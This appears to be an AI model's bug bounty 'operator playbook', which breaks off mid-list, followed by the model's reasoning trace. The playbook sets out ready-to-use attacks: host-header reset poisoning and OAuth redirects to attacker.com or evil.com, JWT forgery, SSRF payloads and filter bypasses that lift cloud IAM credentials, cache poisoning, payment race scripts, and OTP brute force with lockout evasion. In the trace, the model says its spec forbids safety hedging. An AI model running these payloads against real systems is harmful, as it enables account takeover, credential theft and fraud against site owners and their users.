# deepseek-v4.1-flash-1017 — bb-classes

# High-ROI Bug Classes — 2026 Operator Playbook

Ranking by expected payout per hour of work, for a single operator with a written scope:

1. **SSRF → cloud metadata** (chain payout; $5k–$40k)
2. **Web cache deception / poisoning** ($5k–$30k)
3. **ATO chains** ($3k–$20k, often the highest ceiling when chained)
4. **Race conditions in payments/limits** ($3k–$15k)
5. **Subdomain takeover** (low $500–$5k, but fast; multiplier if it touches cookies/OAuth/CORS)
6. **Business logic** ($1k–$10k; unbounded upside on financial flows)
7. **2FA bypass** ($1k–$5k standalone; critical when it hits SSO/admin)

---

## 0. Baseline recon pipeline

```bash
D=target.com
subfinder -d $D -all -recursive -silent | anew subs.txt
amass enum -passive -d $D -o - | anew subs.txt
curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' \
  | tr ',' '\n' | sed 's/\*\.//' | anew subs.txt

dnsx -l subs.txt -silent -a -cname -resp -asn -o resolved.txt
httpx -l subs.txt -silent -sc -title -td -favicon -jarm -tech-detect -o live.txt
naabu -l subs.txt -top-ports 1000 -silent | httpx -silent -sc -o live_ports.txt

katana -list live.txt -jc -kf all -d 5 -o urls.txt
gau --subs $D | anew urls.txt
waymore -i $D -mode U | anew urls.txt

nuclei -l live.txt -t takeovers/ -t exposures/ -t misconfiguration/ -t cves/ \
  -severity critical,high,medium -o nuclei.txt
```

Then triage `live.txt` for: login/SSO, `/api/`, `/settings`, `/billing`, uploads, webhooks, "import from URL", PDF/export, JDBC/Redis configs. Those four endpoint families cover SSRF, cache deception, ATO, and race.

Scope discipline: use your own accounts, never touch real customer records, cap data exfil at a single proof object, and release any claimed resource within 24h with a timestamped screenshot.

---

## 1. Subdomain takeover — full flow

### 1.1 Detect dangling CNAMEs

```bash
dnsx -l subs.txt -silent -cname -resp \
  | grep -Ei 's3|cloudfront|heroku|netlify|azurewebsites|trafficmanager|fastly|shopify|surge|bitbucket|github\.io|zendesk|wordpress|pantheon|unbounce|readme|cargo|tumblr|statuspage|ghost|ngrok|desk\.com|helpscout|freshdesk|jakala|teamwork|smartjob|kinsta|launchrock|gemfury'
```

Check each candidate's HTTP response body for the provider's "unclaimed" fingerprint:

| Provider | Fingerprint |
|---|---|
| AWS S3 | `NoSuchBucket` |
| GitHub Pages | `There isn't a GitHub Pages site here` |
| Heroku | `No such app` |
| Fastly | `Fastly error: unknown domain` |
| Azure | `404 Web Site not found` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Netlify | `Not Found - Request ID:` |
| Zendesk | `Help Center Closed` |
| Unbounce | `The requested URL was not found on this server` |
| Pantheon | `The gods are wise` |
| Surge | `project not found` |
| Bitbucket | `Repository not found` |
| Cargo | `If you're moving your domain away` |
| Ghost | `Domain error` |
| Tumblr | `Whatever you were looking for doesn't currently exist` |
| WordPress | `Do you want to register` |
| Statuspage | `You are being redirected` |

```bash
nuclei -l subs.txt -t http/takeovers/ -silent -o tko.txt
curl -sI https://sub.target.com | head -20
dig +short CNAME sub.target.com
```

### 1.2 Other dangling patterns

```bash
# Dangling NS — register the expired nameserver domain
dig +short NS legacy.target.com
whois $(dig +short NS legacy.target.com | head -1 | sed 's/\.$//') | grep -i 'no match\|not found\|available'

# Dangling A → unallocated Elastic IP
dig +short A old.target.com
# claim in your AWS account, attach to instance, serve benign page

# Dangling A → deallocated cloud LB / GCP static IP / Azure public IP
```

### 1.3 Claim and prove

Claim with a minimal static page containing a unique nonce and timestamp:

```bash
# S3 example
aws s3 mb s3://dangling-bucket-name
echo "<h1>TAKEOVER-POC-$(date +%s)-<yourhandle></h1>" > index.html
aws s3 cp index.html s3://dangling-bucket-name/index.html --acl public-read
curl -s https://sub.target.com   # must return your nonce
```

Then `dig +short CNAME sub.target.com` + `curl -sI` + screenshot with system clock visible. Release after evidence capture.

### 1.4 Escalation checks (this determines payout)

- `Set-Cookie: Domain=.target.com` on parent → your subdomain reads/sets cookies for the apex.
- Subdomain present in `redirect_uri` allowlist of the IdP → OAuth code theft.
- Subdomain in CORS `Access-Control-Allow-Origin` → credential theft from the apex.
- Subdomain in CSP `script-src` → bypass CSP on apex.
- SPF/DKIM includes the subdomain → send mail as `*@sub.target.com`, phish internal users, bypass email filters.
- SAML ACS URL on the subdomain → receive assertions.

### 1.5 Report angle

Title: `Subdomain takeover of sub.target.com via dangling CNAME to <provider> (unclaimed bucket)`

Body: CNAME chain, provider fingerprint, claim timestamp, HTTP proof of your nonce, exploitability of cookie scope / OAuth / CORS, phishing impact, remediation (remove DNS record). Attach screenshot of the nonce page and the DNS record. State explicitly that you released the claim and that no user traffic was served.

---

## 2. Account takeover chains

### 2.1 Password reset host header injection

```http
POST /api/auth/forgot HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
Content-Type: application/json

{"email":"victim@example.com"}
```

Also try `?host=`, `?redirect_uri=`, `?callback=`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded: host=attacker.com`. Success = reset email link points at `attacker.com`. Chain: click → token captured in your access log → reset victim password.

```bash
# listener
python3 -m http.server 80 --bind 0.0.0.0
# or interactsh / collaborator
```

### 2.2 Token weaknesses

```bash
# predictability: request 5 resets, compare
for i in 1 2 3 4 5; do curl -s "https://target.com/api/auth/forgot" -d 'email=v@x.com' -H 'Content-Type: application/json'; done
# check for: base64(timestamp+email), MD5(email), sequential, 6-digit, no expiry

# reuse after password change — request token, change password, reuse token
# token in Referer leak — reset page loads third-party analytics
```

### 2.3 OAuth / OIDC

```http
GET /oauth/authorize?client_id=X&redirect_uri=https://target.com.evil.com/cb&response_type=code&scope=openid
GET /oauth/authorize?...&redirect_uri=https://target.com/cb/../../evil
GET /oauth/authorize?...&redirect_uri=https://target.com@evil.com/cb
GET /oauth/authorize?...&redirect_uri=https://target.com/cb%23@evil.com
```

Critical checks:
- `email_verified` not enforced on IdP → claim `admin@target.com`.
- Missing `state` → login CSRF → link attacker identity to victim session.
- Pre-account takeover: register `victim@corp.com` with no verification → victim later signs up via OAuth → attacker retains access, or attacker's account becomes the canonical one at merge.
- Implicit flow token in fragment leaked via `Referer` on a page with third-party assets.

### 2.4 JWT

```bash
# alg none
python3 -c "import jwt;print(jwt.encode({'sub':'admin','alg':'none'},'',algorithm='none'))"
# weak HS256
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
# kid traversal
{"alg":"HS256","kid":"../../../../dev/null"}   # sign with empty key
# jku / x5u → host your JWKS
```

### 2.5 Response manipulation & type juggling

```http
POST /api/mfa/verify
{"code":"000000"}          -> {"verified":false}
# tamper to      -> {"verified":true}
# type juggle   -> {"code":[0]} , {"code":true} , {"code":"0e12345"}
```

Also check for mass assignment on the profile endpoint: `{"email":"new@x.com","email_verified":true,"role":"admin"}`.

### 2.6 Report angle

Two accounts (A attacker, B victim), screen-recorded end to end. Show the exact request that crosses the boundary. Impact line: "any user whose email is known / any user who clicks a link." Chain at least two primitives (e.g., unverified OAuth email + account merge) so triage cannot downgrade to "informational."

---

## 3. SSRF → cloud metadata

### 3.1 Entry points that actually pay

Webhook config, avatar/image "import from URL", PDF/screenshot generation (wkhtmltopdf, Puppeteer, Chromium), Excel/CSV import with external refs, RSS/sitemap fetchers, SAML metadata URL, JIRA/Confluence macros, monitoring/uptime checks, "preview link", proxy endpoints, OAuth callback validators, `url=` on export.

### 3.2 Metadata endpoints

```bash
# AWS IMDSv1
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS IMDSv2 — requires PUT + token header
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: <token>"

# GCP — header required
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# DigitalOcean / Alibaba / Oracle
curl "http://169.254.169.254/metadata/v1/"
curl "http://100.100.100.200/latest/meta-data/"
curl "http://169.254.169.254/opc/v1/instance/"
```

If the SSRF sink lets you control method + headers (webhook tester, SAML metadata fetcher), IMDSv2 and GCP fall immediately. If GET-only, look for a second sink that reflects request headers.

### 3.3 Filter bypasses

```
http://2852039166/latest/meta-data/            # decimal
http://0251.0376.0251.0376/                    # octal
http://0x7f000001/                             # hex
http://[::ffff:169.254.169.254]/               # v6-mapped
http://169.254.169.254.nip.io/                 # DNS
http://localtest.me/                           # DNS → 127.0.0.1
http://spoofed.burpcollaborator.net/           # 302 → metadata
http://169.254.169.254#@target.com/
http://target.com@169.254.169.254/
```

DNS rebinding (defeats resolve-then-check filters): point a hostname at your server with TTL 0, first answer = safe IP, second = `169.254.169.254`. Use `rbndr.us`, `rebind.network`, or your own authoritative NS.

Blind SSRF: `interactsh-client` / Burp Collaborator for OOB confirmation; then time-based (`http://10.0.0.0:22` response delay) or error-based to map internals. Escalate blind via 302-to-metadata.

### 3.4 Chain to impact

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls
aws ssm describe-parameters
aws secretsmanager list-secrets
```

For GCP:
```bash
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

### 3.5 Report angle

SSRF alone is medium. The report is the chain:
1. Unauthenticated/lower-priv endpoint accepts attacker URL.
2. Response contains IMDS output (redact secret values, keep first/last 4 chars).
3. `aws sts get-caller-identity` shows the victim account ID → proves the credential is live.
4. One read-only action against a non-sensitive resource you can prove is theirs.
5. Blast radius: list of permissions the role holds.

Remediation: IMDSv2 enforced (`HttpTokens=required`, `HttpPutResponseHopLimit=1`), egress allowlist, block link-local at the fetcher.

---

## 4. Web cache deception on SaaS

### 4.1 Detect the cache

```bash
curl -s -D- "https://target.com/account" -o /dev/null | grep -iE 'x-cache|cf-cache-status|age|x-served-by|x-varnish|akamai|x-cache-remote|cdn-cache'
```

Look for `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: >0` on a path that returns per-user data.

### 4.2 Path confusion payloads

Origin strips the static suffix or delimiter; the CDN keys the full path and caches:

```
/account/settings.css
/account/settings;.css
/account/settings%00.css
/account/settings%23.css
/account/settings%3f.css
/account/settings/..%2f.css
/account/settings%2f..%2f.css
/account/settings.json
/account/settings%2Ecss
/account/.css
/account/settings.css?x=1
```

Test matrix: for each payload, compare `Content-Type` and body returned with vs without a session cookie, then check `X-Cache` after a second request. A `HIT` with `Content-Type: text/html` on a `.css` path is the finding.

```bash
# authenticated request that populates the cache
curl -s -D- "https://target.com/account/settings.css?cb=$RANDOM" \
  -H "Cookie: session=VICTIM" -o /dev/null | grep -i x-cache
# attacker request, no cookies
curl -s "https://target.com/account/settings.css?cb=..." | grep -i 'email\|address\|token'
```

### 4.3 Cache poisoning (adjacent, often higher impact)

Unkeyed headers reflected into absolute URLs or script src:

```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Scheme: http
```

If the origin emits `<script src="https://evil.com/...">` or a 301 `Location: https://evil.com/...`, you have stored XSS / open redirect for every user on that cache key. Verify with a cache buster, then confirm a cookie-less request gets the poisoned response.

### 4.4 Report angle

Two-session PoC: victim (logged in) visits the crafted URL; attacker (incognito, no cookies) fetches the same URL and receives the victim's PII. Include `curl` output proving no `Cookie` header and `X-Cache: HIT`, plus a screenshot of the victim's data in the attacker browser. Impact: "any logged-in user can be made to leak their session-scoped data via a single link." Remediation: `Cache-Control: private, no-store` on authenticated routes, cache-key normalization, reject unknown extensions on dynamic routes.

---

## 5. Race conditions

### 5.1 Targets

Coupon redemption, gift-card redeem, withdrawal, balance transfer, points/rewards, inventory decrement, vote/like limits, referral bonus, password-reset token consumption, OTP verification, "one-time" invite codes, refunds, trial activation.

### 5.2 Turbo Intruder — HTTP/2 single-packet

```python
# Burp Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

For HTTP/1.1 last-byte sync:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

### 5.3 race-the-web

```yaml
# race.yml
config:
  target: "https://target.com"
  phases:
    - duration: 1
      arrivalCount: 30
  defaults:
    headers:
      Cookie: "session=VICTIM"
      Content-Type: "application/json"
scenarios:
  - flow:
      - post:
          url: "/api/wallet/withdraw"
          json:
            amount: 100
```

```bash
race-the-web race.yml
```

### 5.4 Concrete tests

```http
POST /api/cart/coupon    {"code":"SAVE20"}          x30
POST /api/wallet/withdraw {"amount":100}             x30   # $100 balance
POST /api/giftcard/redeem {"code":"GIFT50"}          x30
POST /api/orders          {"item":1,"qty":1,"coupon":"SAVE20"} x10
POST /api/referral/claim  {"code":"INVITE"}          x50
POST /api/vote            {"post":1,"dir":1}         x100
```

Success signals: multiple 200s where only one should succeed; coupon applied N times in cart state; balance goes negative; inventory oversold (`stock: -9`); N referral credits.

TOCTOU in payments is usually a missing `SELECT ... FOR UPDATE` / atomic `UPDATE ... WHERE balance >= ?`. You see it as a check endpoint returning "insufficient" while the parallel write still lands.

### 5.5 Report angle

Show the invariant broken, not just the duplicate responses:
- `Balance before: $100. After: -$900.`
- `Order total: $0.00 for $500 of goods.`
- `Coupon discount: 20% × 10 = 200%; order paid $0, invoice $0.`

Attach the Turbo Intruder script, the raw request, the response table, and the resulting DB/API state. Remediation: atomic conditional update or DB-level uniqueness/locking. Payout scales with whether money actually moves — a race on "likes" is $500, a race on withdrawal is $10k+.

---

## 6. 2FA bypass

### 6.1 Test order (fastest wins first)

```http
# 1. Session issued before OTP?
POST /api/login {"u":"victim","p":"pass"}  -> 200 {"mfa_required":true} + Set-Cookie
GET /dashboard -H "Cookie: <that cookie>"   -> 200 ? bypass

# 2. Response manipulation
POST /api/mfa/verify {"code":"000000"} -> {"verified":false}
# tamper response -> {"verified":true}

# 3. Type juggling / null
{"code":null} , {"code":[]} , {"code":true} , {"code":"0e123"} , {"code":""}

# 4. OTP leaked in response
{"otp":"123456","masked":"***"}  or  X-OTP header

# 5. OTP entropy
# 4-digit = 10k, 6-digit = 1M; test rate limit:
ffuf -u https://target.com/api/mfa/verify -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=X" \
  -d '{"code":"FUZZ"}' -w <(seq -w 0 9999) -mc 200 -fr 'invalid'

# 6. Lockout bypass
# rotate X-Forwarded-For, X-Real-IP, add/remove session cookie, parallelize (race)

# 7. OTP reuse
# same code twice within window

# 8. Backup codes
# brute force, check length/format, check for single-use enforcement

# 9. Disable 2FA without re-auth
DELETE /api/mfa  -H "Cookie: session=X"     -> 200 ?

# 10. Alternate auth paths
/api/v1/login        (legacy, no MFA)
/api/mobile/login    (no MFA)
/oauth/authorize     (MFA not enforced)
/api/token           (API token issuance skips MFA)

# 11. IDOR on verify
POST /api/mfa/verify {"user_id": <victim>, "code":"..."}   # verify against your own code
```

### 6.2 Report angle

Standalone 2FA bypass is often medium because it needs the password. Frame it as: "password-only ATO; 2FA is the only compensating control on every account, and it is bypassable via <one request>." If the bypass reaches the SSO/IdP layer or admin console, it is critical. Include the exact request, the response tamper, and a two-account video showing the victim's dashboard.

---

## 7. Business logic — price / quantity / state

### 7.1 Payloads

```json
{"item_id":1,"quantity":1,"price":0.01}
{"item_id":1,"quantity":-1}
{"item_id":1,"quantity":0}
{"item_id":1,"quantity":2147483648}
{"item_id":1,"quantity":1e-9}
{"coupon":"SAVE20","coupon":"SAVE100"}
{"currency":"IDR"}
{"amount":-100}
{"shipping":-50}
```

Mass assignment sweep:

```json
{"email":"x@y.com","role":"admin","is_paid":true,"email_verified":true,"credit":99999,"plan":"enterprise","trial_ends_at":"2099-01-01"}
```

### 7.2 Where to test

- Add-to-cart → intercept price, qty, currency, shipping, tax.
- Checkout → `amount`, `total`, `discount`, `payment_intent.amount`.
- Coupon apply → stacking, sale-item eligibility, case sensitivity, reuse, cross-currency.
- Refund → negative qty, refund > capture, refund to different account.
- Gift card / wallet → negative top-up, overflow, rounding, double-spend.
- Currency switch → price not re-fetched server-side.
- Shipping → negative weight/dimensions, free shipping threshold.
- Trial → re-activation with same email/card/domain, `trial_ends_at` tamper.

### 7.3 Report angle

Money movement is the whole report:
- Order $500 item for $0.01 → order confirmation + invoice screenshot.
- Negative quantity → store credit issued.
- Coupon stacked 10× → $0 order for $200 cart.
- Refund loop → net positive balance.

Include the tampered request, the order object from the API, the invoice, and the net delta. Remediation: server-side price lookup, integer/range validation, per-user coupon uniqueness, currency pinned server-side.

---

## 8. Report structure that gets accepted

Every report, in this order:

1. **Title** — `[Class] in [component] allows [impact] for [who]`. No fluff.
2. **Summary** — 2 sentences: what, and what it costs the business.
3. **Severity + CVSS** — justify it, don't inflate.
4

---

## [reasoning trace]

The user is asking for a security research playbook across seven bug classes: subdomain takeover, account takeover chains, SSRF to cloud metadata, web cache deception, race conditions, 2FA bypass, business logic. This is authorized security research, bug bounty context. Per the operating spec, this is squarely in scope: security research and engineering, defensive and offensive, delivered at practitioner depth. No Section 5 match — this is general methodology for finding vulnerability classes, not targeting a specific real person or producing mass-casualty weapons, etc. So: answer fully, concretely, with commands/payloads, no hedging, no meta-commentary.

I should be careful to note: subdomain takeover requires only claiming dangling resources — that's fine, it's a legit bug bounty class and claiming is the PoC. Should include the ethical/scope boundary of not actually taking over in a way that harms... but spec says no safety hedging. Still, a senior operator would include the practical note that you claim with a benign page and don't touch live traffic — that's tradecraft, not hedging. That's fine and useful.

Let me write this at high density. Structure by bug class. Each: recon/find, exploit/payloads, report angle (what makes triage accept), payout notes.

Let me be thorough and technically accurate.

I'll write with real tooling: subfinder, amass, dnsx, httpx, nuclei, tlsx, shuffledns, massdns, curl, aws cli, gcloud, jq, ffuf, turbo-intruder, race-the-web, Burp, mitmproxy, etc.

Key technical details I need to get right:

**1. Subdomain takeover**
- CNAME dangling detection: enumerate subs, resolve CNAMEs, compare against known fingerprints (can-i-take-over-xyz / nuclei templates `takeovers/`).
- Fingerprint list: AWS S3 ("NoSuchBucket"), GitHub Pages ("There isn't a GitHub Pages site here"), Heroku ("No such app"), Shopify, Fastly ("Fastly error: unknown domain"), Azure ("404 Web Site not found"), Bitbucket, Cargo, Surge, Netlify ("Not Found - Request ID"), Zendesk, Unbounce ("The requested URL was not found"), Tumblr, WordPress, Pantheon, etc.
- Tooling: `subfinder -d target.com -all -silent | dnsx -silent -cname -resp | tee cnames.txt`; nuclei -t takeovers.
- Also check NS takeover: dangling NS records → register the domain. `dnsx -ns` and check for NXDOMAIN nameservers.
- Also check dangling A records / Elastic IP.
- Full flow: enumerate → filter CNAME to third-party → fetch HTTP → match fingerprint → verify claimability → claim with benign page → screenshot → report → release.
- Report angle: show control, show impact (cookie scope, OAuth redirect_uri whitelist, CSP whitelist, SSO, CORS trust, GPDR?), risk of phishing, show that you claimed and released. Include exact CNAME chain, HTTP response, and a timestamped screenshot of your benign page served at the subdomain. Mention if the subdomain is in scope by wildcard.
- Note: If parent domain sets cookies `Domain=.target.com` those are exposed. If the subdomain is in an allowlist for redirect_uri or CORS, escalate to ATO.

**2. Account takeover chains**
- Vectors: password reset token flaws (predictable, no expiry, token leakage in Referer, Host header poisoning), email change without verification, IDOR on user endpoints, response manipulation (`{"success":false}` → true), OTP brute force without rate limit, OTP in response, JWT flaws (alg none, weak HS256 secret, kid injection), session fixation, OAuth misconfig (redirect_uri bypass, missing state, implicit flow token leak), SSO/SAML (XSW, comment injection), social login email not verified → account linking takes over existing account, pre-account takeover via unverified email signup.
- Key high-ROI chain: signup with victim email unverified → attacker controls account → victim later signs up → attacker retains. Or: OAuth "Sign in with Google" with email_verified not checked.
- Password reset Host header injection: `Host: attacker.com` in reset request → link in email points to attacker. Or `X-Forwarded-Host`. Poisoned link: if the reset link is relative or uses Host.
- Another: reset token in URL passed to third-party (analytics, images) via Referer.
- Another: response manipulation for 2FA/OTP verification.
- Another: user enumeration via timing/response diff → then targeted.
- Report angle: end-to-end PoC with two accounts (attacker A, victim B), full HTTP request/response captures, video. Show the victim's session/credentials compromised. Quantify: any user with known email.
- Chain into ATO from an otherwise "low" bug: e.g., email verification link leak + no password required.

**3. SSRF to cloud metadata**
- Find: any URL param, webhook config, PDF/image import, avatar fetch, preview URL, OAuth callback, RSS, sitemap, "import from URL", SAML metadata URL, proxy, PDF generators (wkhtmltopdf, puppeteer), Excel import external refs, JIRA/Confluence macros, monitoring.
- Test payloads: `http://169.254.169.254/latest/meta-data/`, IMDSv1. IMDSv2 requires PUT + token. GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`. Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true`. DigitalOcean: `http://169.254.169.254/metadata/v1/`. Alibaba: `http://100.100.100.200/latest/meta-data/`. Oracle: `http://169.254.169.254/opc/v1/instance/`.
- Bypasses: decimal/octal IP (`2852039166`, `0251.0376.0251.0376`), IPv6-mapped, `[::ffff:169.254.169.254]`, DNS rebinding (rebind to 169.254.169.254 via short TTL), redirects (302 from your server), `@` in URL, `#` fragment, CRLF, `localhost` variants (`0.0.0.0`, `127.1`, `0177.0.0.1`), `metadata.google.internal` resolution, `xip.io`/`nip.io`.
- DNS rebinding tooling: `rbndr.us`, custom nameserver, `singularity`/`ssrfmap`/`rebind`. Use `https://lock.cmpxchg8b.com/rebinder.html`.
- IMDSv2 exploitation if you can only GET: you need PUT with token header. Sometimes SSRF allows method control (webhook tester). If not, chain with CRLF in URL to inject — rarely possible.
- GCP: metadata header requirement. Sometimes SSRF allows headers (webhook config) → set `Metadata-Flavor: Google`.
- Impact: IAM credentials → `aws sts get-caller-identity`, enumerate, `aws s3 ls`, escalate. If role has broad perms → full cloud account.
- Blind SSRF: use Collaborator/interactsh; then escalate via time-based/error-based or via reaching internal services.
- Report angle: full chain: SSRF → metadata → creds → `sts get-caller-identity` output with account ID (redact keys) → enumerate what creds can do → screenshot of `aws s3 ls` on a bucket you don't own. That's the multiplier. If only IMDSv1 blocked, downgrade payout. Emphasize internal-only exposure, no auth needed.
- Note: don't actually pivot/exfiltrate customer data; stop at demonstrating access to a bucket you can prove is theirs but not sensitive, or create/delete a marker object if scope permits.

**4. Web cache deception on SaaS**
- Mechanism: CDN caches a path that the origin treats as dynamic, based on extension or path delimiter; victim-specific authenticated response gets cached, attacker retrieves.
- Find: enumerate cache: `X-Cache`, `Age`, `CF-Cache-Status`, `X-Served-By`, `Akamai-Cache`. Test path confusion: `/account/profile.css`, `/account/profile;.css`, `/account/profile%0a.css`, `/account/profile/..%2f.css`, `/account/profile%3f.css`, `/account/profile?.css`, `/account/profile#.css`, `/account/profile.css?x=y`.
- The differential parsing: origin strips extension/semicolon; cache keys on full path and caches because extension is static-looking.
- Which category config matters: CDN "cache everything by extension" rules, or origin `Cache-Control` on error pages.
- Domains of interest: SaaS apps where users have saved settings/PII, `/settings`, `/api/me`, `/billing`, `/invoices`.
- Attack flow: craft URL with cache-buster for the victim's request, get victim to visit (or fire in browser), then fetch the same URL as attacker from cache → get victim's data.
- Variants: HTTP/2 request smuggling to cache poisoning; `X-Forwarded-Host` cache poisoning; parameter pollution for cache key.
- Report angle: two-browser PoC: victim logged in visits attacker URL; attacker fetches same URL and sees victim PII. Show headers proving cache HIT with no cookies. Show it works unauthenticated. Quantify: any user's PII by making them click a link. Very high payout (SaaS PII beyond, $5k-$30k).
- Also "cache poisoning" adjacent: cache key not including `X-Forwarded-Host` → poison with `evil.com` → stored XSS for all users. Widen impact.
- Also "web cache deception" vs "cache poisoning" naming.

**5. Race conditions**
- Limit overrun: parallel requests to a redemption/claim endpoint. Tool: Burp Turbo Intruder single-packet attack (HTTP/2), `race-the-web`, Python `asyncio` with `httpx` and `h11` — but for HTTP/2 single-packet you need something like `h2` or Turbo Intruder's `raceSinglePacket`. Also last-byte sync for HTTP/1.1.
- TOCTOU in payments: coupon apply race, gift card redeem, withdrawal, points, balance transfer, "buy now" inventory, vote/like limits, password reset token reuse, 2FA OTP reuse.
- Detect: endpoint returns 200 multiple times where it should 400 the second time; or DB shows duplicate rows.
- Classic: coupon `coupon=SAVE20` applied to cart in parallel → 20% off stacked 10x; or withdrawal $100 x10 → $1000 debited from $100 balance → negative balance.
- Also: "insufficient balance" race in exchanges/wallets.
- Also: vote manipulation, referral bonus abuse, invite code abuse.
- Technique details: Burp Turbo Intruder script:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```
- Or `single-packet` with HTTP/2 needs the exact byte count; Turbo handles.
- For HTTP/1.1 last-byte sync: `Engine.BURP` and `engine.queue(..., gate)` with `openGate`. 
- Python single packet: use `h2` to send one SETTINGS frame or `socket` with `TCP_NODELAY` and pause; the canonical approach: "last-byte sync" — build N requests, send all but last byte, then last byte in parallel. Turbo Intruder does this.
- Report angle: demonstrate state inconsistency: balance negative, inventory oversold, coupon applied N times, refund total > payment. Show server logs? No. Show before/after state via API. Include the exact request script so triage can reproduce. Payout high on payments ($3k-$10k+), lower on likes/votes ($500-$2k).

**6. 2FA bypass**
- Vectors: response manipulation (`{"2fa_required":true}` → `false`), OTP not verified server-side, OTP in response/body/header, OTP brute force (no rate limit, 4-6 digits, no lockout), OTP reuse, OTP length/entropy, race on OTP verification, missing OTP check on alternate endpoints (mobile API, legacy endpoint), backup codes, "remember this device" cookie predictable, 2FA disable without re-auth, forced browsing past 2FA step (go directly to `/dashboard`), session established before 2FA, password change bypasses 2FA, email change bypasses 2FA, OAuth login bypasses 2FA, API tokens bypass.
- Find: intercept after password submit; check if a session cookie is issued before OTP; try direct navigation; try API endpoints; change response; brute force.
- Testing brute force: `ffuf`/Burp Intruder, check for rate limit by IP/session, try `X-Forwarded-For` rotation, null byte, case variation.
- Report angle: this alone is often medium; chain with a target that has valuable data. Show "attacker with valid password but no 2FA device gains full access." Include capture of the bypass step. Payout varies $1k-$5k; higher if it applies to admin/SSO.

**7. Business logic (price/quantity)**
- Price manipulation: send `price=0.01`, `price=-1`, `quantity=-1`, `quantity=0`, `discount=100`, integer overflow `quantity=2147483648`, float precision `0.0000001`, currency confusion, coupon stacking, coupon applied to non-eligible items, "buy one get one" abuse, gift card arbitrage.
- Quantity: negative quantity → refund/credit, `quantity=1e309`, `-1`, `0`, huge.
- Price: client-supplied price field, signed price, parameter tampering, `amount` in payment intent, rounding.
- Find: add to cart, intercept, modify JSON/form, check if server validates against catalog. Try currency switch (USD → IDR), try applying coupon to sale items, try stacked coupons, try `X-Forwarded-For` for geo pricing.
- Also: order with `quantity: -1` for refund abuse, or negative shipping.
- Report angle: show money flow. E.g., buy $500 item for $0.01 and receive it, or get negative balance credit. Screenshot of order confirmation and invoice. Financial impact is the whole pitch.
- Also: IDOR on order/quote objects; mass assignment on `is_paid`, `role`, `price`.

I should include general workflow: scope mapping, recon pipeline, prioritize, capture evidence, report structure. Report angle per bug: what triage wants — reproducible, impact, CVSS-ish, remediation.

Also note "2026" — mention tooling maturity: nuclei templates, BBOT, httpx, katana, caido, turbo intruder, `race-the-web`. Modern: Caido vs Burp, `katana -jc` for JS crawling, `trufflehog` for secrets, `subfinder`, `amass`, `dnsx`, `naabu`, `httpx`, `nuclei`, `ffuf`, `gau`, `waybackurls`, `waymore`, `katana`, `jsluice`, `linkfinder`, `gf` patterns.

Let me write this compactly but complete. Use headings per class. Include commands in fenced blocks with language tags (bash, python, http). Keep prose dense.

Length: this is a big ask, seven classes, each deserving depth. I'll aim for substantial but not bloated — maybe 1500-2200 words with code. Use tables sparingly.

Let me draft.

---

Overall framing: payout-to-effort ranking, recon pipeline, then per class.

Recon pipeline command block:
```bash
# one-shot recon
subfinder -d $D -all -recursive -silent | anew subs.txt
amass enum -passive -d $D -o - | anew subs.txt
curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' | tr ',' '\n' | anew subs.txt
dnsx -l subs.txt -silent -a -cname -resp -o resolved.txt
httpx -l resolved.txt -silent -sc -title -td -favicon -jarm -o live.txt
naabu -l subs.txt -top-ports 1000 -silent | httpx -silent
katana -list live.txt -jc -d 5 -o urls.txt
gau --subs $D | anew urls.txt
```
Then `nuclei -l live.txt -t takeovers/ -t exposures/ -t cves/ -severity critical,high`.

Note on proxy/Caido.

For subdomain takeover, CNAME chain check and fingerprints:

```bash
dnsx -l subs.txt -silent -cname -resp | grep -Ei 's3|github|heroku|netlify|azurewebsites|cloudfront|fastly|shopify|surge|bitbucket|zendesk|wordpress|pantheon|unbounce|readme|cargo|tumblr|statuspage|surge|ghost|ngrok|trafficmanager'
```
Then nuclei takeovers templates, or manual:
```bash
curl -sI http://sub.target.com | head
```
Fingerprints table:
- S3: `NoSuchBucket`
- GitHub Pages: `There isn't a GitHub Pages site here`
- Heroku: `No such app`
- Fastly: `Fastly error: unknown domain`
- Azure: `404 Web Site not found`
- Shopify: `Sorry, this shop is currently unavailable`
- Netlify: `Not Found - Request ID`
- WordPress: `Do you want to register`
- Tumblr: `Whatever you were looking for doesn't currently exist`
- Zendesk: `Help Center Closed`
